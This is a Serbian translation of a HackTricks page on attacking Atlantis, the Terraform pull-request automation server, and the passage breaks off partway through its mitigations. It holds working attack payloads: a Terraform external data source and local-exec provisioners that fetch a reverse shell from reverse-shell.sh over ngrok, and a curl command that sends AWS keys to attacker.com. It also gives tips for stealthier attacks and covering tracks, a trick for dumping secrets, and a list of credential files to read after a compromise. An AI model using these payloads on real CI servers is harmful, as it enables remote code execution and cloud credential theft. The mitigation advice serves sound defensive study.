# Bezbednost Atlantisa

<details>

<summary><strong>Nau캜ite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi na캜ini podr코ke HackTricks-u:

* Ako 쬰lite da vidite **va코u kompaniju reklamiranu u HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRETPLATU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvani캜ni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), na코u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridru쬴te se** 游눫 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** me na **Twitter-u** 游냕 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

## Osnovne informacije

Atlantis vam u osnovi poma쬰 da pokrenete terraform iz Pull zahteva sa va코eg git servera.

![](<../.gitbook/assets/image (51).png>)

## Lokalni Lab

1. Idite na **atlantis stranicu za preuzimanje** na [https://github.com/runatlantis/atlantis/releases](https://github.com/runatlantis/atlantis/releases) i **preuzmite** onu koja vam odgovara.
2. Kreirajte **li캜ni token** (sa pristupom repozitorijumu) za va코eg **github** korisnika.
3. Izvr코ite `./atlantis testdrive` i on 캖e kreirati **demo repozitorijum** koji mo쬰te koristiti za **komunikaciju sa atlantisom**.
1. Mo쬰te pristupiti web stranici na 127.0.0.1:4141

## Pristup Atlantisu

### Git Server Kredencijali

**Atlantis** podr쬬va nekoliko git hostova kao 코to su **Github**, **Gitlab**, **Bitbucket** i **Azure DevOps**.\
Me캠utim, da bi pristupio repozitorijumima na tim platformama i izvr코avao akcije, potrebno je da im se dodeli neki **privilegovani pristup** (barem dozvole za pisanje).\
[**Dokumentacija**](https://www.runatlantis.io/docs/access-credentials.html#create-an-atlantis-user-optional) preporu캜uje da se kreira korisnik na ovim platformama specifi캜no za Atlantis, ali neki ljudi mogu koristiti li캜ne naloge.

{% hint style="warning" %}
U svakom slu캜aju, sa perspektive napada캜a, **Atlantis nalog** 캖e biti veoma **interesantan za kompromitovanje**.
{% endhint %}

### Webhookovi

Atlantis opciono koristi [**Webhook tajne**](https://www.runatlantis.io/docs/webhook-secrets.html#generating-a-webhook-secret) da bi proverio da li su **webhookovi** koje prima od va코eg Git hosta **legitimni**.

Jedan na캜in da se to potvrdi je da se **dozvole samo zahteve koji dolaze sa IP adresa** va코eg Git hosta, ali jednostavniji na캜in je kori코캖enje Webhook tajni.

Imajte na umu da, osim ako koristite privatni github ili bitbucket server, mora캖ete da izlo쬴te webhook endpointe na internetu.

{% hint style="warning" %}
Atlantis 캖e **izlagati webhookove** tako da git server mo쬰 slati informacije. Sa perspektive napada캜a, bilo bi interesantno znati **da li mo쬰te slati poruke**.
{% endhint %}

### Kredencijali Provajdera <a href="#provider-credentials" id="provider-credentials"></a>

[Prema dokumentaciji:](https://www.runatlantis.io/docs/provider-credentials.html)

Atlantis pokre캖e Terraform jednostavno izvr코avanjem `terraform plan` i `apply` komandi na serveru na kojem je hostovan Atlantis. Ba코 kao i kada pokre캖ete Terraform lokalno, Atlantisu su potrebne kredencijale za va코 specifi캜ni provajder.

Na vama je kako 캖ete [pru쬴ti kredencijale](https://www.runatlantis.io/docs/provider-credentials.html#aws-specific-info) za va코 specifi캜ni provajder Atlantisu:

* Atlantis [Helm Chart](https://www.runatlantis.io/docs/deployment.html#kubernetes-helm-chart) i [AWS Fargate Modul](https://www.runatlantis.io/docs/deployment.html#aws-fargate) imaju sopstvene mehanizme za kredencijale provajdera. Pro캜itajte njihovu dokumentaciju.
* Ako pokre캖ete Atlantis u oblaku, mnogi oblaci imaju na캜ine da daju pristup cloud API-ju aplikacijama koje se na njima izvr코avaju, na primer:
* [AWS EC2 Role](https://registry.terraform.io/providers/hashicorp/aws/latest/docs) (Pretra쬴te "EC2 Role")
* [GCE Instance Service Accounts](https://registry.terraform.io/providers/hashicorp/google/latest/docs/guides/provider\_reference)
* Mnogi korisnici postavljaju environment varijable, na primer `AWS_ACCESS_KEY`, gde se izvr코ava Atlantis.
* Drugi kreiraju neophodne konfiguracione fajlove, na primer `~/.aws/credentials`, gde se izvr코ava Atlantis.
* Koristite [HashiCorp Vault Provider](https://registry.terraform.io/providers/hashicorp/vault/latest/docs) da biste dobili kredencijale provajdera.

{% hint style="warning" %}
**Kontejner** u kojem se **Atlantis izvr코ava** 캖e verovatno sadr쬬ti privilegovane kredencijale za provajdere (AWS, GCP, Github...) koje Atlantis upravlja putem Terraforma.
{% endhint %}

### Web Stranica

Podrazumevano, Atlantis 캖e pokrenuti **web stranicu na portu 4141 na localhostu**. Ova stranica vam samo omogu캖ava da omogu캖ite/onemogu캖ite atlantis apply, proverite status plana repozitorijuma i otklju캜ate ih (ne dozvoljava modifikaciju stvari, pa nije toliko korisna).

Verovatno je ne캖ete na캖i izlo쬰nu na internetu, ali izgleda da podrazumevano **nije potrebno korisni캜ko ime i lozinka** za pristup (a ako su potrebni, podrazumevani su `atlantis`:`atlantis`).

## Konfiguracija Servera

Konfiguracija za `atlantis server` mo쬰 se specificirati putem komandnih linija, environment varijabli, konfiguracionog fajla ili kombinacijom sve tri opcije.

* Mo쬰te prona캖i [**ovde listu podr쬬nih zastavica**](https://www.runatlantis.io/docs/server-configuration.html#server-configuration) od strane Atlantis servera
* Mo쬰te prona캖i [**ovde kako pretvoriti opciju konfiguracije u environment varijablu**](https://www.runatlantis.io/docs/server-configuration.html#environment-variables)

Vrednosti se **biraju u slede캖em redosledu**:

1. Zastavice
2. Environment Varijable
3. Konfiguracioni Fajl

{% hint style="warning" %}
Imajte na umu da u konfiguraciji mo쬰te prona캖i interesantne vrednosti kao 코to su **tokeni i lozinke**.
{% endhint %}

### Konfiguracija Repozitorijuma

Neke konfiguracije uti캜u na **upravljanje repozitorijumima**. Me캠utim, mogu캖e je da **svaki repozitorijum zahteva razli캜ite pode코avanja**, pa postoje na캜ini da se specificira svaki repozitorijum. Ovo je prioritetni redosled:

1. Repo [**`/atlantis.yml`**](https://www.runatlantis.io/docs/repo-level-atlantis-yaml.html#repo-level-atlantis-yaml-config) fajl. Ovaj fajl se mo쬰 koristiti da se specificira kako atlantis treba da tretira repozitorijum. Me캠utim, podrazumevano neke klju캜ne vrednosti ne mogu biti specificirane ovde bez odgovaraju캖ih zastavica.
1. Verovat
#### Za코tita PR-a

Atlantis omogu캖ava da nazna캜ite da **PR** bude **`odobren`** od strane nekog drugog (캜ak i ako to nije postavljeno u za코titi grane) i/ili da bude **`spojiv`** (za코tita grane je pro코la) **pre pokretanja primene**. Sa aspekta bezbednosti, preporu캜uje se postavljanje oba opcije.

U slu캜aju da je `allowed_overrides` postavljeno na True, ove pode코avanja mogu biti **prepisana na svakom projektu putem `/atlantis.yml` fajla**.

#### Skripte

Konfiguracija repozitorijuma mo쬰 **specificirati skripte** koje se pokre캖u [**pre**](https://www.runatlantis.io/docs/pre-workflow-hooks.html#usage) (_pre workflow hooks_) i [**posle**](https://www.runatlantis.io/docs/post-workflow-hooks.html) (_post workflow hooks_) izvr코avanja **workflow-a**.

Ne postoji opcija da se **specificiraju** ove skripte u **repozitorijumskom `/atlantis.yml`** fajlu.

#### Workflow

U konfiguraciji repozitorijuma (konfiguracija na serveru) mo쬰te [**specificirati novi podrazumevani workflow**](https://www.runatlantis.io/docs/server-side-repo-config.html#change-the-default-atlantis-workflow), ili [**kreirati nove prilago캠ene workflow-e**](https://www.runatlantis.io/docs/custom-workflows.html#custom-workflows)**.** Tako캠e mo쬰te **specificirati** koji **repozitorijumi** mogu **pristupiti** novim generisanim workflow-ima.\
Zatim, mo쬰te dozvoliti da **atlantis.yaml** fajl svakog repozitorijuma **specificira workflow koji 캖e se koristiti**.

{% hint style="danger" %}
Ako je zastavica [**server side config**](https://www.runatlantis.io/docs/server-side-repo-config.html#server-side-config) `allow_custom_workflows` postavljena na **True**, workflow-i se mogu **specificirati** u **`atlantis.yaml`** fajlu svakog repozitorijuma. Tako캠e je potencijalno potrebno da **`allowed_overrides`** tako캠e specificira **`workflow`** kako bi se **prepisao workflow** koji 캖e biti kori코캖en.\
Ovo 캖e prakti캜no omogu캖iti **RCE na Atlantis serveru svakom korisniku koji mo쬰 pristupiti tom repozitorijumu**.
```yaml
# atlantis.yaml
version: 3
projects:
- dir: .
workflow: custom1
workflows:
custom1:
plan:
steps:
- init
- run: my custom plan command
apply:
steps:
- run: my custom apply command
```
{% endhint %}

#### Provera politika Conftest

Atlantis podr쬬va pokretanje **server-side** [**conftest**](https://www.conftest.dev/) **polisa** nad izlazom plana. Uobi캜ajene upotrebe ovog koraka uklju캜uju:

* Odbijanje kori코캖enja liste modula
* Provera atributa resursa prilikom kreiranja
* Otkrivanje nenamernog brisanja resursa
* Sprje캜avanje sigurnosnih rizika (npr. izlaganje sigurnih portova javnosti)

Mo쬰te proveriti kako ga konfigurisati u [**dokumentaciji**](https://www.runatlantis.io/docs/policy-checking.html#how-it-works).

## Komande Atlantisa

[**U dokumentaciji**](https://www.runatlantis.io/docs/using-atlantis.html#using-atlantis) mo쬰te prona캖i opcije koje mo쬰te koristiti za pokretanje Atlantisa:
```bash
# Get help
atlantis help

# Run terraform plan
atlantis plan [options] -- [terraform plan flags]
##Options:
## -d directory
## -p project
## --verbose
## You can also add extra terraform options

# Run terraform apply
atlantis apply [options] -- [terraform apply flags]
##Options:
## -d directory
## -p project
## -w workspace
## --auto-merge-disabled
## --verbose
## You can also add extra terraform options
```
## Napadi

{% hint style="warning" %}
Ako tokom eksploatacije nai캠ete na ovu **gre코ku**: `Error: Error acquiring the state lock`

Mo쬰te je popraviti pokretanjem:
```
atlantis unlock #You might need to run this in a different PR
atlantis plan -- -lock=false
```
{% endhint %}

### Atlantis plan RCE - Izmena konfiguracije u novom PR-u

Ako imate pristup pisanja nad repozitorijumom, mo캖i 캖ete da kreirate novu granu na njemu i generi코ete PR. Ako mo쬰te **izvr코iti `atlantis plan`** (ili mo쬯a se automatski izvr코ava), **mo캖i 캖ete da izvr코ite RCE unutar Atlantis servera**.

To mo쬰te uraditi tako 코to 캖ete [**Atlantis u캜itati spoljni izvor podataka**](https://registry.terraform.io/providers/hashicorp/external/latest/docs/data-sources/data\_source). Samo stavite payload kao 코to je prikazano u `main.tf` fajlu:
```json
data "external" "example" {
program = ["sh", "-c", "curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh"]
}
```
#### Stealthier napad

Mo쬰te izvesti ovaj napad 캜ak i na **diskretniji na캜in**, prate캖i ove sugestije:

* Umesto da direktno dodate rev 코el u terraform fajl, mo쬰te **u캜itati spoljni resurs** koji sadr쬴 rev 코el:
```javascript
module "not_rev_shell" {
source = "git@github.com:carlospolop/terraform_external_module_rev_shell//modules"
}
```
Rev shell kod mo쬰te prona캖i na [https://github.com/carlospolop/terraform\_external\_module\_rev\_shell/tree/main/modules](https://github.com/carlospolop/terraform\_external\_module\_rev\_shell/tree/main/modules)

* U spoljnom resursu, koristite **ref** opciju da sakrijete **terraform rev shell kod u grani** unutar repozitorijuma, ne코to poput: `git@github.com:carlospolop/terraform_external_module_rev_shell//modules?ref=b401d2b`
* Umesto da kreirate **PR na master** da biste pokrenuli Atlantis, **kreirajte 2 grane** (test1 i test2) i napravite **PR iz jedne u drugu**. Kada zavr코ite napad, jednostavno **uklonite PR i grane**.

### Atlantis plan Dump tajni

Mo쬰te **izvu캖i tajne koje koristi terraform** pokretanjem `atlantis plan` (`terraform plan`) tako 코to 캖ete dodati ne코to poput ovoga u terraform fajl:
```json
output "dotoken" {
value = nonsensitive(var.do_token)
}
```
### Atlantis primena RCE - Modifikacija konfiguracije u novom PR-u

Ako imate pristup pisanja nad repozitorijumom, mo캖i 캖ete da kreirate novu granu na njemu i generi코ete PR. Ako mo쬰te **izvr코iti `atlantis apply`, mo캖i 캖ete da izvr코ite RCE unutar Atlantis servera**.

Me캠utim, obi캜no 캖ete morati zaobi캖i neke za코tite:

* **Mergeable**: Ako je ova za코tita postavljena u Atlantisu, mo쬰te pokrenuti **`atlantis apply` samo ako je PR mergeable** (코to zna캜i da je potrebno zaobi캖i za코titu grane).
* Proverite mogu캖e [**zaobila쬰nje za코tite grane**](broken-reference/)
* **Approved**: Ako je ova za코tita postavljena u Atlantisu, **neki drugi korisnik mora odobriti PR** pre nego 코to mo쬰te pokrenuti `atlantis apply`
* Podrazumevano mo쬰te zloupotrebiti [**Gitbot token za zaobila쬰nje ove za코tite**](broken-reference/)

Pokretanje **`terraform apply` na zlonamernom Terraform fajlu sa** [**local-exec**](https://www.terraform.io/docs/provisioners/local-exec.html)**.**\
Samo se pobrinite da se neki payload poput slede캖ih nalazi u fajlu `main.tf`:
```json
// Payload 1 to just steal a secret
resource "null_resource" "secret_stealer" {
provisioner "local-exec" {
command = "curl https://attacker.com?access_key=$AWS_ACCESS_KEY&secret=$AWS_SECRET_KEY"
}
}

// Payload 2 to get a rev shell
resource "null_resource" "rev_shell" {
provisioner "local-exec" {
command = "sh -c 'curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh'"
}
}
```
Pratite **predloge iz prethodne tehnike** kako biste izveli ovaj napad na **diskretniji na캜in**.

### Injekcija parametara u Terraform

Prilikom pokretanja `atlantis plan` ili `atlantis apply`, Terraform se pokre캖e unutar atlantisa, a mo쬰te proslediti komande Terraformu iz atlantisa komentari코u캖i ne코to poput:
```bash
atlantis plan -- <terraform commands>
atlantis plan -- -h #Get terraform plan help

atlantis apply -- <terraform commands>
atlantis apply -- -h #Get terraform apply help
```
Ne코to 코to mo쬰te proslediti su env promenljive koje mogu biti korisne za zaobila쬰nje odre캠enih za코tita. Proverite terraform env promenljive na [https://www.terraform.io/cli/config/environment-variables](https://www.terraform.io/cli/config/environment-variables)

### Prilago캠eni radni tok

Pokretanje **zlonamernih prilago캠enih komandi za izgradnju** koje su navedene u `atlantis.yaml` fajlu. Atlantis koristi `atlantis.yaml` fajl sa grane zahteva za povla캜enje, **ne** sa `master` grane.\
Ova mogu캖nost je pomenuta u prethodnom odeljku:

{% hint style="danger" %}
Ako je zastavica [**server side config**](https://www.runatlantis.io/docs/server-side-repo-config.html#server-side-config) `allow_custom_workflows` postavljena na **True**, radni tokovi mogu biti **specificirani** u `atlantis.yaml` fajlu svakog repozitorijuma. Tako캠e je potencijalno potrebno da **`allowed_overrides`** tako캠e specificira **`workflow`** kako bi se **zamenio radni tok** koji 캖e biti kori코캖en.

Ovo 캖e prakti캜no omogu캖iti **RCE na Atlantis serveru svakom korisniku koji mo쬰 pristupiti tom repozitorijumu**.
```yaml
# atlantis.yaml
version: 3
projects:
- dir: .
workflow: custom1
workflows:
custom1:
plan:
steps:
- init
- run: my custom plan command
apply:
steps:
- run: my custom apply command
```
{% endhint %}

### Zaobila쬰nje za코tite planiranja/primene

Ako je zastavica [**konfiguracija sa strane servera**](https://www.runatlantis.io/docs/server-side-repo-config.html#server-side-config) `allowed_overrides` _konfigurisana_ sa `apply_requirements`, mogu캖e je da repozitorijum **izmeni za코titu planiranja/primene kako bi je zaobi코ao**.
```yaml
repos:
- id: /.*/
apply_requirements: []
```
### PR Hijacking

Ako neko po코alje komentare **`atlantis plan/apply`** na va쬰캖e pull zahteve, to 캖e pokrenuti terraform kada to ne 쬰lite.

Osim toga, ako nemate konfigurisano **ograni캜enje grane** da tra쬴 **ponovno ocenjivanje** svakog PR-a kada se na njega po코alje **novi commit**, neko bi mogao **napisati zlonamerne konfiguracije** (proverite prethodne scenarije) u terraform konfiguraciji, pokrenuti `atlantis plan/apply` i dobiti RCE.

Ovo je **pode코avanje** u Github ograni캜enjima grane:

![](<../.gitbook/assets/image (31).png>)

### Webhook Secret

Ako uspete **ukrasti webhook secret** koji se koristi ili ako se **ne koristi nikakav webhook secret**, mogli biste **pozvati Atlantis webhook** i **izvr코iti atlantis komande** direktno.

### Bitbucket

Bitbucket Cloud **ne podr쬬va webhook secret**. To bi omogu캖ilo napada캜ima da **falsifikuju zahteve sa Bitbucket-a**. Proverite da li dozvoljavate samo IP adrese Bitbucket-a.

* Ovo zna캜i da **napada캜** mo쬰 poslati **la쬹e zahteve Atlantisu** koji izgledaju kao da dolaze sa Bitbucket-a.
* Ako specificirate `--repo-allowlist`, oni bi mogli samo falsifikovati zahteve koji se odnose na te repozitorije, tako da bi najve캖a 코teta koju bi mogli naneti bila planiranje/primena na va코im sopstvenim repozitorijima.
* Da biste to spre캜ili, dozvolite [IP adrese Bitbucket-a](https://confluence.atlassian.com/bitbucket/what-are-the-bitbucket-cloud-ip-addresses-i-should-use-to-configure-my-corporate-firewall-343343385.html) (vidi izlazne IPv4 adrese).

## Post-Exploitation

Ako ste uspeli da pristupite serveru ili barem dobili LFI, postoje neke zanimljive stvari koje biste trebali poku코ati pro캜itati:

* `/home/atlantis/.git-credentials` Sadr쬴 pristupne podatke za vcs
* `/atlantis-data/atlantis.db` Sadr쬴 pristupne podatke za vcs sa vi코e informacija
* `/atlantis-data/repos/<org_name>`_`/`_`<repo_name>/<pr_num>/<workspace>/<path_to_dir>/.terraform/terraform.tfstate` Terraform stanje datoteke
* Primer: /atlantis-data/repos/ghOrg\_/\_myRepo/20/default/env/prod/.terraform/terraform.tfstate
* `/proc/1/environ` Env promenljive
* `/proc/[2-20]/cmdline` Komandna linija `atlantis server` (mo쬰 sadr쬬ti osetljive podatke)

## Mitigacije

### Ne koristite na javnim repozitorijumima <a href="#don-t-use-on-public-repos" id="don-t-use-on-public-repos"></a>

Zato 코to svako mo쬰 komentarisati javne pull zahteve, 캜ak i sa svim dostupnim sigurnosnim merama, opasno je pokretati Atlantis na javnim repozitorijumima bez odgovaraju캖e konfiguracije sigurnosnih pode코avanja.

### Ne koristite `--allow-fork-prs` <a href="#don-t-use-allow-fork-prs" id="don-t-use-allow-fork-prs"></a>

Ako koristite javni repozitorijum (코to se ne preporu캜uje, vidi gore), ne biste trebali postaviti `--allow-fork-prs` (podrazumevano je false) jer svako mo쬰 otvoriti pull zahtev sa svog forka ka va코em repozitorijumu.

### `--repo-allowlist` <a href="#repo-allowlist" id="repo-allowlist"></a>

Atlantis zahteva da specificirate listu dozvoljenih repozitorijuma od kojih 캖e prihvatati webhook-ove putem `--repo-allowlist` zastavice. Na primer:

* Specifi캜ni repozitorijumi: `--repo-allowlist=github.com/runatlantis/atlantis,github.com/runatlantis/atlantis-tests`
* Ceo va코a organizacija: `--repo-allowlist=github.com/runatlantis/*`
* Svi repozitorijumi u va코oj GitHub Enterprise instalaciji: `--repo-allowlist=github.yourcompany.com/*`
* Svi repozitorijumi: `--repo-allowlist=*`. Korisno kada ste u za코ti캖enoj mre쬴, ali opasno bez postavljanja webhook secret-a.

Ova zastavica osigurava da se va코a Atlantis instalacija ne koristi sa repozitorijumima koje ne kontroli코ete. Pogledajte `atlantis server --help` za vi코e detalja.

### Za코tita Terraform planiranja <a href="#protect-terraform-planning" id="protect-terraform-planning"></a>

Ako je podno코enje pull zahteva sa zlonamernim Terraform kodom u va코em modelu pretnje, morate biti svesni da odobrenja za `terraform apply` nisu dovoljna. Mogu캖e je pokrenuti zlonamerni kod u `terraform plan` koriste캖i [`external` data source](https://registry.terraform.io/providers/hashicorp/external/latest/docs/data-sources/data\_source) ili navo캠enjem zlonamernog providera. Taj kod bi mogao izvu캖i va코e akreditive.

Da biste to spre캜ili, mo쬰te:

1. Ugraditi providere u sliku Atlantisa ili hostovati ih i zabraniti izlazak u produkciji.
2. Implementirati protokol registra providera interno i zabraniti javni izlazak, na taj na캜in kontroli코ete ko ima pristup za pisanje u registar.
3. Izmenite [konfiguraciju repozitorijuma na serverskoj strani](https://www.runatlantis.io/docs/server-side-repo-config.html) `plan` koraka da bi se validiralo kori코캖enje zabranjenih providera ili izvora podataka ili PR-ova od nedozvoljenih korisnika. Tako캠e mo쬰te dodati dodatnu validaciju u ovom koraku, na primer zahtevanje "pal캜eva gore" na PR pre nego 코to se dozvoli nastavak `plan`-a. Conftest bi mogao biti koristan ovde.

### Webhook Secrets <a href="#webhook-secrets" id="webhook-secrets"></a>

Atlantis bi trebalo pokrenuti sa postavljenim Webhook secret-om putem `$ATLANTIS_GH_WEBHOOK_SECRET`/`$ATLANTIS_GITLAB_WEBHOOK_SECRET` okru쬰njskih promenljivih. 캛ak i sa postavljenom `--repo-allowlist` zastavicom, bez webhook secret-a, napada캜i bi mogli slati zahteve Atlantisu predstavljaju캖i se kao repozitorijum koji je na dozvoljenoj listi. Webhook secret-i osiguravaju da webhook zahtevi zaista dolaze od va코eg VCS provajdera (GitHub ili GitLab).

Ako koristite Azure DevOps, umesto webhook secret-a dodajte osnovno korisni캜ko ime i lozinku.

### Azure DevOps osnovna autentifikacija <a href="#azure-devops-basic-authentication" id="azure-devops-basic-authentication"></a>

Azure DevOps podr쬬va slanje osnovne autentifikacije u svim webhook doga캠ajima. To zahteva kori코캖enje HTTPS URL-a za lokaciju webhook-a.

### SSL/HTTPS <a href="#ssl-https" id="ssl-https"></a>

Ako koristite webhook secret-e, ali va코 saobra캖aj je preko HTTP-a, webhook secret-i mogu biti ukradeni. Omogu캖ite SSL/HTTPS kori코캖enjem `--ssl-cert-file` i `--ssl-key-file` zastavica.

### Omogu캖ite autentifikaciju na Atlantis web serveru <a href="#enable-authentication-on-atlantis-web-server" id
